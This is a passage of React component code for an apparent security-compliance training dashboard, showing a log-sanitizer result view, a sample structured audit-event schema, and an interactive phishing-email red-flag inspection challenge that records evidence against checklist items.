                    value={sanitizedLogs}
                    className="w-full bg-slate-950 border border-emerald-500/30 rounded-lg p-3 font-mono text-xs text-emerald-300 focus:outline-none"
                  />
                </div>
              </div>

              <button
                onClick={() => {
                  if (onRecordEvidence) {
                    onRecordEvidence(
                      'LOG-02',
                      `Demonstrated log sanitizer regex filter in lab. Successfully detected and redacted ${detectedViolationsCount} plain secrets including passwords and card tokens.`
                    );
                  }
                }}
                className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
              >
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Attach Test Evidence to LOG-02 Checklist</span>
              </button>
            </div>
          )}

          {logSubTab === 'event' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
              <h3 className="text-base font-semibold text-white">Compliant Security Event Schema</h3>
              <p className="text-xs text-slate-400">
                CIS Control 8.5 specifies that structured audit logs must capture: Timestamp (UTC ISO 8601), Actor ID, Event Classification, Source IP, Target Resource, and Result Status.
              </p>

              <div className="p-4 bg-slate-950 border border-slate-800 rounded-lg font-mono text-xs text-indigo-300 leading-relaxed overflow-x-auto">
                {JSON.stringify(
                  {
                    version: '1.2.0',
                    timestamp: new Date().toISOString(),
                    event_id: 'evt_99841920',
                    event_type: 'USER_ROLE_ELEVATION',
                    severity: 'HIGH',
                    actor: {
                      id: 'usr_admin_102',
                      email: 'sarah.vance@apexpay.internal',
                      ip_address: '198.51.100.42',
                      user_agent: 'Mozilla/5.0 (Security Audit Session)',
                    },
                    target: {
                      id: 'usr_intern_884',
                      resource_type: 'USER_ACCOUNT',
                      action: 'GRANT_ROLE',
                      assigned_role: 'SECURITY_AUDITOR',
                    },
                    audit_verification: {
                      mfa_verified: true,
                      session_id: 'sess_live_7721',
                      immutable_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
                    },
                  },
                  null,
                  2
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ---------------- MODULE 5: AWARENESS CHALLENGE ---------------- */}
      {activeModule === 'awareness' && (
        <div className="space-y-6">
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
            <div className="flex items-center justify-between flex-wrap gap-2">
              <div>
                <h3 className="text-base font-semibold text-white">Interactive Phishing Email Inspection Challenge</h3>
                <p className="text-xs text-slate-400 mt-1">
                  Inspect the simulated email below. Find and flag all red flags (lookalike sender domains, artificial urgency, dangerous attachments, deceptive URLs).
                </p>
              </div>

              <div className="flex gap-2">
                {phishingScenarios.map((scen, idx) => (
                  <button
                    key={scen.id}
                    onClick={() => {
                      setActivePhishingIndex(idx);
                    }}
                    className={`px-3 py-1.5 text-xs font-semibold rounded-lg transition-colors ${
                      activePhishingIndex === idx
                        ? 'bg-indigo-600 text-white'
                        : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                    }`}
                  >
                    Scenario {idx + 1}
                  </button>
                ))}
              </div>
            </div>

            {/* Email Client Viewport */}
            <div className="bg-slate-950 border border-slate-800 rounded-xl overflow-hidden">
              <div className="bg-slate-900/80 px-4 py-3 border-b border-slate-800 flex items-center justify-between text-xs">
                <span className="font-semibold text-white">{currentScenario.subject}</span>
                <span className="text-slate-500 font-mono">{currentScenario.date}</span>
              </div>

              <div className="p-4 space-y-2 border-b border-slate-800 text-xs">
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 w-16">From:</span>
                  <span className="font-semibold text-white">{currentScenario.senderName}</span>
                  <span className="font-mono text-rose-400 bg-rose-500/10 px-2 py-0.5 rounded border border-rose-500/20">
                    &lt;{currentScenario.senderEmail}&gt;
                  </span>
                </div>
              </div>

              <div className="p-5 font-mono text-xs text-slate-300 whitespace-pre-wrap leading-relaxed">
                {currentScenario.body}
              </div>
            </div>

            {/* Flags Checklist */}
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <h4 className="text-xs font-semibold text-white uppercase tracking-wider">
                  Auditor Red Flag Checklist ({flagsFoundForCurrent} / {currentScenario.flags.length} Identified)
                </h4>
                {allFlagsFound && (
                  <span className="text-xs font-semibold text-emerald-400 flex items-center gap-1">
                    <CheckCircle2 className="w-4 h-4" /> Scenario Successfully Neutralized!
                  </span>
                )}
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                {currentScenario.flags.map((flag) => {
                  const isChecked = !!detectedFlags[flag.id];
                  return (
                    <button
                      key={flag.id}
                      onClick={() => toggleFlag(flag.id)}
                      className={`p-3 rounded-lg border text-left text-xs transition-colors flex items-start gap-2.5 ${
                        isChecked
                          ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-200'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
                      }`}
                    >
                      <div
                        className={`w-4 h-4 rounded mt-0.5 flex items-center justify-center shrink-0 ${
                          isChecked ? 'bg-emerald-500 text-slate-950 font-bold' : 'border border-slate-700'
                        }`}
                      >
                        {isChecked && <Check className="w-3 h-3" />}
                      </div>
                      <span>{flag.label}</span>
                    </button>
                  );
                })}
              </div>
            </div>

            <button
              onClick={() => {
                if (onRecordEvidence) {
                  onRecordEvidence(
                    'AWR-01',
                    `Completed phishing inspection simulation scenario "${currentScenario.title}". Correctly identified spoofed lookalike domains, artificial coercive urgency, and dangerous payloads.`
                  );
                }
              }}
              className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
            >
              <CheckCircle2 className="w-3.5 h-3.5" />
              <span>Attach Test Evidence to AWR-01 Checklist</span>
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
